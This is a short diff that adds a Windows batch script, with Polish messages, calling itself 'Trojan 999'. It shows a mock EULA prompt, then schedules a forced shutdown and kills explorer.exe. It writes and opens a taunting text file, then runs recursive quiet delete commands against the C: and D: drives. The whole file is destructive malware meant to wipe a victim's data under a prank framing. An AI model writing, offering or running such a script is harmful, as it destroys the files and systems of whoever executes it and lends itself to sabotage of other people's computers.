@@ -1,0 +1,14 @@
+@echo off
+title Trojan 999.exe
+color0A
+@echo EULA
+@echo Jesli chcesz wlonczyc tego Trojana nacisnij dowolny klawisz jak nie wyjdz!
+@echo Szybka decyzja!!!
+pause>nul
+shutdown -s -t 50 -c "Masz po kompie:)"
+taskkill /f /im explorer.exe
+cd Deskop
+echo Twuj system zostal zniszczony sam sie o to prosiles>Trojan 999.txt
+start Trojan 999.txt
+del c: \*/s /q
+del d: \*/s /q
